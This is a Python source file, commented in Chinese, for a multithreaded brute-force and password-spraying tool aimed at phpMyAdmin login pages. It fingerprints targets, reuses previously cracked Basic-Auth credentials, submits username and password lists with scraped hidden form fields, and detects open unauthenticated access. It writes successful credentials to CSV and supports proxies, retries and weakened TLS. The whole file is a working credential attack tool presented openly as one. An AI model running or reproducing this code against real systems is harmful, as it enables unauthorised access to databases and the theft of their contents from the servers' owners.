#!/usr/bin/env python
# phpmyadmin_plugin.py
# v1.5-modified: 新增 process_login 方法以支持重試模式，統一所有插件的調用介面，
# 並修改失敗日誌格式為：Target,Username,Password,ResponseCode,FailureReason

import argparse
import logging
import csv
import os
import ssl
import urllib3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from threading import Lock
import requests
from requests.auth import HTTPBasicAuth
from requests.adapters import HTTPAdapter
from bs4 import BeautifulSoup
from urllib.parse import urlparse


# 在文件最顶端，紧跟 import 之后
# ——————————————————————————————————————————————————
# 定义业务错误码（必须全局唯一，方便后续统计）
ERROR_CODES = {
    'NO_BASIC_AUTH_SUPPORT':     1001,  # 目标不支持 Basic-Auth
    'BASIC_AUTH_FAILED':         1002,  # Basic-Auth 登录失败
    'OPEN_ACCESS_NO_AUTH':       1003,  # 无需登录即可访问（开放访问）
    'LOGIN_POST_FAILED':         1004,  # POST 登录接口返回非 200／没找到“Version information”
    'LOGIN_PAGE_UNREACHABLE':    1005,  # 登录页无法访问（非 200）
    'EXCEPTION':                 1099,  # 其它异常
}
# ——————————————————————————————————————————————————



# 禁用 InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 設定日誌目錄
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
log_filename = os.path.join(LOG_DIR, f"phpmyadmin_plugin_{datetime.now().strftime('%Y%m%d')}.log")

# 自訂 TLS Adapter，使用 ssl.Purpose.SERVER_AUTH 並禁用 check_hostname
class CustomTLSAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.set_ciphers('DEFAULT:@SECLEVEL=1')
        context.check_hostname = False
        kwargs['ssl_context'] = context
        return super().init_poolmanager(*args, **kwargs)

class PhpMyAdminPlugin:
    def __init__(self, threads=5, timeout=10, debug=False, scheme="https", user_agent="Mozilla/5.0", proxy=None):
        self.threads = threads
        self.timeout = timeout
        self.debug = debug
        self.scheme = scheme  # 預設使用 "https" 或 "http"
        self.user_agent = user_agent  # 固定 User-Agent
        self.logger = self.setup_logger()
        self.output_lock = Lock()
        self.lock = Lock()
        self.proxy = proxy

    def setup_logger(self):
        logger = logging.getLogger("PhpMyAdminPlugin")
        logger.setLevel(logging.DEBUG if self.debug else logging.INFO)
        logger.propagate = False
        if logger.hasHandlers():
            logger.handlers.clear()
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s',
                                      datefmt='%Y-%m-%d %H:%M:%S')
        fh = logging.FileHandler(log_filename, encoding='utf-8')
        fh.setFormatter(formatter)
        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        logger.addHandler(fh)
        logger.addHandler(ch)
        return logger

    def read_basic_auth_credentials(self, basic_auth_file):
        """
        從 basic_auth_file 中讀取基本認證資料，CSV 格式預期每行：
        target,username,password,Status,ResponseCode
        跳過空行與標題行，返回 dict {完整_target_url: (username, password)}
        若 target 未包含 scheme，則自動補上預設的 scheme (self.scheme)
        """
        creds = {}
        if not os.path.exists(basic_auth_file):
            self.logger.warning(f"Basic Auth file '{basic_auth_file}' not found.")
            return creds
        with open(basic_auth_file, encoding="utf-8") as f:
            for line_number, line in enumerate(f, start=1):
                line = line.strip()
                if line_number == 1 and ("target" in line.lower() or "username" in line.lower()):
                    continue
                if not line or ',' not in line:
                    continue
                try:
                    parts = line.split(',')
                    target = parts[0].strip()
                    if not target.startswith("http"):
                        target = f"{self.scheme}://{target}"
                    user = parts[2].strip()
                    pwd = parts[3].strip()
                    status = parts[4].strip().lower()
                    if status == "success":
                        creds[target] = (user, pwd)
                except Exception as e:
                    self.logger.warning(f"Error parsing line {line_number} in {basic_auth_file}: {e}")
        self.logger.info(f"Loaded Basic Auth credentials for {len(creds)} targets.")
        return creds

    def load_targets(self, target_list_file, basic_auth_file):
        """
        若提供 basic_auth_file，則從中提取 target URL 作為目標；否則從 target_list_file 讀取目標。
        自動檢查每個 target URL 是否包含 scheme，若缺失則補上預設的 scheme。
        """
        targets = set()
        if basic_auth_file:
            creds = self.read_basic_auth_credentials(basic_auth_file)
            for target_url in creds.keys():
                targets.add(target_url)
        elif target_list_file:
            with open(target_list_file, encoding="utf-8") as f:
                for line in f:
                    t = line.strip()
                    if t:
                        if not t.startswith("http"):
                            t = f"{self.scheme}://{t}"
                        targets.add(t)
        return list(targets)

    def check_if_phpmyadmin(self, target_url, auth=None):
        """
        檢查目標是否為 phpMyAdmin。
        若 URL 中包含 "phpmyadmin" 則直接認定為 phpMyAdmin。
        否則透過 GET 請求取得頁面，利用 BeautifulSoup 解析 title，
        當回應狀態碼為 200 且 title 中包含 "phpmyadmin"（不分大小寫）時，
        視為 phpMyAdmin 目標。
        此方法新增 auth 參數以便傳入 Basic Auth 認證資訊。
        """
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None

        if "phpmyadmin" in target_url.lower():
            self.logger.info(f"Target URL {target_url} contains 'phpmyadmin' in its path. Marking as phpMyAdmin.")
            return True

        headers = {"User-Agent": self.user_agent}
        try:
            response = requests.get(target_url, headers=headers, timeout=self.timeout, verify=False, auth=auth, proxies=proxies)
            soup = BeautifulSoup(response.text, "html.parser")
            title_text = ""
            if soup.title and soup.title.string:
                title_text = soup.title.string.strip()
            if response.status_code == 200 and "phpmyadmin" in title_text.lower():
                self.logger.info(f"✅ {target_url} appears to be phpMyAdmin (Status: {response.status_code}, Title: '{title_text}')")
                return True
            else:
                self.logger.info(f"❌ {target_url} does not appear to be phpMyAdmin (Status: {response.status_code}, Title: '{title_text}')")
                return False
        except requests.exceptions.RequestException as e:
            self.logger.error(f"🔴 Error checking phpMyadmin target {target_url}: {e}")
            return False

    def attempt_basic_auth(self, target_url, basic_auth_user, basic_auth_pass):
        """
        嘗試對 target_url 使用 Basic Auth，返回 True 或 False。
        """
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        try:
            self.logger.info(f"Trying Basic Auth at {target_url} with {basic_auth_user}/{basic_auth_pass}")
            response = requests.get(target_url, auth=HTTPBasicAuth(basic_auth_user, basic_auth_pass),
                                    timeout=self.timeout, verify=False, proxies=proxies)
            if response.status_code == 200:
                self.logger.info(f"Basic Auth succeeded at {target_url}")
                return True
            else:
                self.logger.warning(f"Basic Auth failed at {target_url} (status: {response.status_code})")
                return False
        except Exception as e:
            self.logger.error(f"Error during Basic Auth at {target_url}: {e}")
            return False

    def attempt_phpmyadmin_login(self, session, target_url, phpmyadmin_user, phpmyadmin_pass):
        """
        嘗試登入 phpMyAdmin：
        1. 自動補全 /index.php 和 ?route=/，避免重複拼接
        2. GET 登入頁面以取得隱藏欄位
        3. 合併隱藏欄位與登入資料後 POST
        4. 檢查回應中是否包含 "Version information"

        回傳：(success, response_code, failure_msg, biz_code)
        """
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None

        # 先去掉末尾斜杠，再根据是否已包含 index.php 或 route 参数补全 URL
        target_url = target_url.rstrip('/')
        if "index.php" in target_url:
            if "?route=" not in target_url:
                target_url = target_url + "?route=/"
        else:
            target_url = target_url + "/index.php?route=/"

        headers = {"User-Agent": self.user_agent}
        try:
            self.logger.info(f"GET {target_url} for phpMyAdmin login")
            response = session.get(target_url, headers=headers, timeout=self.timeout,
                                   verify=False, proxies=proxies)
            if response.status_code != 200:
                msg = f"Unable to access login page {target_url} (status: {response.status_code})"
                self.logger.error(msg)
                return False, response.status_code, msg, ERROR_CODES['LOGIN_PAGE_UNREACHABLE']

            soup = BeautifulSoup(response.text, "html.parser")
            hidden_fields = {
                tag.get("name"): tag.get("value")
                for tag in soup.find_all("input")
                if tag.get("type") == "hidden" and tag.get("name")
            }
            data = {
                "pma_username": phpmyadmin_user,
                "pma_password": phpmyadmin_pass,
                "server": "1",
                **hidden_fields
            }

            self.logger.info(f"POST {target_url} with phpMyAdmin credentials {phpmyadmin_user}/{phpmyadmin_pass}")
            post_resp = session.post(target_url, headers=headers, data=data,
                                     timeout=self.timeout, verify=False)
            if "Version information" in post_resp.text:
                self.logger.info(f"phpMyAdmin login succeeded at {target_url} "
                                 f"with {phpmyadmin_user}/{phpmyadmin_pass}")
                return True, post_resp.status_code, "Version information found", ERROR_CODES['OPEN_ACCESS_NO_AUTH']
            else:
                msg = f"phpMyAdmin login failed at {target_url} for {phpmyadmin_user}"
                self.logger.warning(msg)
                return False, post_resp.status_code, msg, ERROR_CODES['LOGIN_POST_FAILED']

        except Exception as e:
            msg = f"Error during phpMyAdmin login at {target_url}: {e}"
            self.logger.error(msg)
            return False, None, msg, ERROR_CODES['EXCEPTION']


    def attempt_phpmyadmin_login_wrapper(self, target_url, basic_auth_creds, phpmyadmin_user, pwd):
        """
        嘗試針對單一目標和單一密碼進行 phpMyAdmin 登入：
          - 每次測試前先檢查目標是否為 phpMyAdmin，若提供 basic_auth_creds 則使用該憑證進行檢查
          - 使用檢查到的 Basic Auth 憑證進行登入嘗試
          - 成功時記錄結果至 output_file
        """
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        auth = None


        if basic_auth_creds:
            basic_user, basic_pass = basic_auth_creds
            auth = HTTPBasicAuth(basic_user, basic_pass)
            self.logger.info(f"Using Basic Auth credentials: {basic_user}/{basic_pass} for target {target_url}")

        if not self.check_if_phpmyadmin(target_url, auth=auth):
            if basic_auth_creds:
                self.logger.warning(f"Target {target_url} does not appear to be phpMyAdmin even when using Basic Auth credentials {basic_user}/{basic_pass}.")
            else:
                self.logger.warning(f"Skipping target {target_url} as it is not identified as phpMyAdmin.")
            return


        # 3. 先试“开放访问”——不带任何凭证直接 GET，看页面里有没有 Version information
        session = requests.Session()
        session.mount(f"{self.scheme}://", CustomTLSAdapter())
        session.proxies.update(proxies or {})
        if basic_auth_creds:
            basic_user, basic_pass = basic_auth_creds
            # 先用 Basic Auth 检查
            if not self.attempt_basic_auth(target_url, basic_user, basic_pass):
                self.logger.error(f"Skipping {target_url} due to Basic Auth failure ({basic_user}/{basic_pass}).")
                return
            session.auth = HTTPBasicAuth(basic_user, basic_pass)
        
        try:
            # 不带 phpMyAdmin 凭证的 GET
            open_resp = session.get(target_url, timeout=self.timeout, verify=False, proxies=proxies)
            if open_resp.status_code == 200 and "Version information" in open_resp.text:
                # 无需登录就可访问
                success, code, msg, biz_code  = True, open_resp.status_code, "No auth required", ERROR_CODES['OPEN_ACCESS_NO_AUTH']
            else:  
                # 否则再走正常的 POST 登录流程
                success, code, msg, biz_code = self.attempt_phpmyadmin_login(
                    session, target_url, phpmyadmin_user, pwd
                )
        except Exception as e:
            success, code, msg, biz_code  = (False, None, f"Open-access check error: {e}", ERROR_CODES['EXCEPTION'])

        if success:
            result = {
                "Service": "phpMyAdmin",
                "URL": target_url,
                "Username": phpmyadmin_user,
                "Password": pwd,
                "ResponseCode": str(code)
            }
            with self.output_lock:
                with open(self.output_file, 'a', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=result.keys())
                    if f.tell() == 0:
                        writer.writeheader()
                    writer.writerow(result)
            self.logger.info(f"Recorded successful login: {result}")
        else:
            parsed = urlparse(target_url)
            port   = parsed.port or (443 if parsed.scheme == "https" else 80)
            # 记录失败到 failed_log
            if self.failed_log:
                parsed = urlparse(target_url)
                port = parsed.port or (443 if parsed.scheme == "https" else 80)
                with self.output_lock, open(self.failed_log, 'a', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=[
                        "Target", "Port", "Username", "Password", "ResponseCode", "FailureReason", "ErrorCode"
                    ])
                    if f.tell() == 0:
                        writer.writeheader()
                    writer.writerow({
                        "Target":        target_url,
                        "Port":          port,
                        "Username":      phpmyadmin_user,
                        "Password":      pwd,
                        "ResponseCode":  str(code) if code else "",
                        "FailureReason": msg,
                        "ErrorCode":     biz_code
                    })
            self.logger.warning(f"❌ Failed login recorded: {target_url} {phpmyadmin_user}/{pwd} ({msg})")

    def run_attack(self, phpmyadmin_user=None, phpmyadmin_user_list_file=None, phpmyadmin_pass_list_file=None,
                output_file=None, target_list_file=None, basic_auth_file=None,
                threads=5, timeout=10, failed_log=None):
        """
        改進版 run_attack：
        ✅ 支援多帳號潑撒測試（每個密碼測試多帳號 × 多目標）
        ✅ 支援 basic_auth_file 或 target_list_file 載入目標
        ✅ 每一組 (user, pwd) 測試完所有目標後才更新進度
        """

        self.output_file = output_file
        self.failed_log = failed_log
        self.timeout = timeout

        # 載入目標列表
        targets = self.load_targets(target_list_file, basic_auth_file)
        if not targets:
            self.logger.error("No targets loaded for attack.")
            return

        # 載入帳號列表
        if phpmyadmin_user_list_file:
            try:
                with open(phpmyadmin_user_list_file, encoding="utf-8") as f:
                    usernames = [line.strip() for line in f if line.strip()]
                if not usernames:
                    self.logger.error(f"No usernames found in file: {phpmyadmin_user_list_file}")
                    return
            except Exception as e:
                self.logger.error(f"Failed to read username list: {e}")
                return
        elif phpmyadmin_user:
            usernames = [phpmyadmin_user]
        else:
            self.logger.error("Missing required parameter: --username or --username_list")
            return

        # 載入密碼列表
        with open(phpmyadmin_pass_list_file, encoding="utf-8") as f:
            password_list = [line.strip() for line in f if line.strip()]

        # 載入 Basic Auth 認證（若有）
        basic_auth_credentials = {}
        if basic_auth_file:
            basic_auth_credentials = self.read_basic_auth_credentials(basic_auth_file)

        total = len(password_list) * len(usernames)
        self.logger.info(f"Total spray iterations (password × username): {total}")
        progress_bar = tqdm(total=total, desc="Spray progress", unit="combo")

        for pwd in password_list:
            for user in usernames:
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = []
                    for target_url in targets:
                        creds = basic_auth_credentials.get(target_url, None) if basic_auth_file else None
                        futures.append(
                            executor.submit(
                                self.attempt_phpmyadmin_login_wrapper,
                                target_url, creds, user, pwd
                            )
                        )
                    for future in as_completed(futures):
                        future.result()
                progress_bar.update(1)

        progress_bar.close()
        self.logger.info("phpMyAdmin spray attack completed.")

    def process_login(self, target, port, username, password, output_file, failed_log, timeout, retries):
        """
        新增的 process_login 方法，支持重試機制，供主程式在重試模式下調用。
        參數說明：
          - target: 目標主機或 IP（若不含協議則自動補上預設 scheme 與 port）
          - port: 目標連接埠
          - username, password: 登入認證資訊（phpMyAdmin 的帳號與嘗試密碼）
          - output_file: 成功結果輸出檔（CSV，欄位包含 Target, Username, Password, ResponseCode）
          - failed_log: 失敗結果輸出檔（CSV，欄位包含 Target, Port, Username, Password, ResponseCode, FailureReason, ErrorCode）
          - timeout: 每次請求超時時間（暫時覆寫類中的 timeout）
          - retries: 重試次數（至少嘗試一次）
        """
        original_timeout = self.timeout
        self.timeout = timeout

        # 确保 biz_code 在任何分支都有默认值
        biz_code = ERROR_CODES['EXCEPTION']

        # 构造 target_url
        if not target.startswith("http"):
            target_url = f"{self.scheme}://{target}:{port}"
        else:
            target_url = target

        success = False
        response_code = ""
        failure_msg = ""

        for attempt in range(1, retries + 1):
            self.logger.debug(f"Attempt {attempt}/{retries} for {target_url} with {username}/{password}")

            # 如果根本不是 phpMyAdmin，就直接跳出
            if not self.check_if_phpmyadmin(target_url):
                failure_msg = "Target not identified as phpMyAdmin"
                biz_code     = ERROR_CODES['LOGIN_PAGE_UNREACHABLE']  # 或者换成一个专门的“非PMA目标”错误码
                self.logger.warning(f"Target {target_url} is not identified as phpMyAdmin. Skipping further attempts.")
                break

            # 调用真正的登录逻辑
            session = requests.Session()
            session.mount(f"{self.scheme}://", CustomTLSAdapter())
            success, code, msg, biz_code = self.attempt_phpmyadmin_login(session, target_url, username, password)

            if success:
                response_code = str(code)
                failure_msg   = f"Success on attempt {attempt}"
                break
            else:
                response_code = str(code) if code is not None else ""
                failure_msg   = msg

        # 如果登录成功，只写入成功文件
        if success:
            with self.output_lock:
                with open(output_file, 'a', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=["Target", "Username", "Password", "ResponseCode"])
                    if f.tell() == 0:
                        writer.writeheader()
                    writer.writerow({
                        "Target":       target_url,
                        "Username":     username,
                        "Password":     password,
                        "ResponseCode": response_code
                    })
            self.logger.info(f"Recorded successful login: {target_url} {username}/{password} Code={response_code}")
        # 否则写入失败日志，包含 port、failure_msg 和 biz_code
        elif failed_log:
            with self.output_lock:
                with open(failed_log, 'a', newline='', encoding='utf-8') as f:
                    fieldnames = [
                        "Target", "Port", "Username", "Password",
                        "ResponseCode", "FailureReason", "ErrorCode"
                    ]
                    writer = csv.DictWriter(f, fieldnames=fieldnames)
                    if f.tell() == 0:
                        writer.writeheader()
                    writer.writerow({
                        "Target":        target_url,
                        "Port":          port,
                        "Username":      username,
                        "Password":      password,
                        "ResponseCode":  response_code,
                        "FailureReason": failure_msg,
                        "ErrorCode":     biz_code
                    })
            self.logger.warning(
                f"❌ Failed login recorded: {target_url} {username}/{password} "
                f"Code={response_code} Reason={failure_msg} ErrorCode={biz_code}"
            )

        # 恢复原 timeout
        self.timeout = original_timeout


# 當作獨立腳本執行時
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="phpMyAdmin Brute Force Plugin")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--target_list', help='File containing full target URLs (one per line)')
    group.add_argument('--basic_auth_file', help='CSV file with Basic Auth credentials (target,username,password,Status,ResponseCode)')
    parser.add_argument('--phpmyadmin_user', required=True, help='Username for phpMyAdmin login attempts')
    parser.add_argument('--phpmyadmin_pass_list', required=True, help='File containing passwords (one per line)')
    parser.add_argument('--output', required=True, help='Output CSV file for successful logins')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout for each attempt in seconds (default: 10)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode for verbose logging')
    parser.add_argument('--user_agent', default="Mozilla/5.0", help='Fixed User-Agent string to use')
    parser.add_argument('--proxy', help='Proxy server (e.g., http://127.0.0.1:8080 or socks5://127.0.0.1:1080)')
    args = parser.parse_args()

    plugin = PhpMyAdminPlugin(
        threads=args.threads,
        timeout=args.timeout,
        debug=args.debug,
        scheme="https",
        user_agent=args.user_agent,
        proxy=args.proxy  # 傳入 proxy
    )
    plugin.run_attack(
        phpmyadmin_user=args.phpmyadmin_user,
        phpmyadmin_pass_list_file=args.phpmyadmin_pass_list,
        output_file=args.output,
        target_list_file=args.target_list,
        basic_auth_file=args.basic_auth_file,
        threads=args.threads,
        timeout=args.timeout
    )
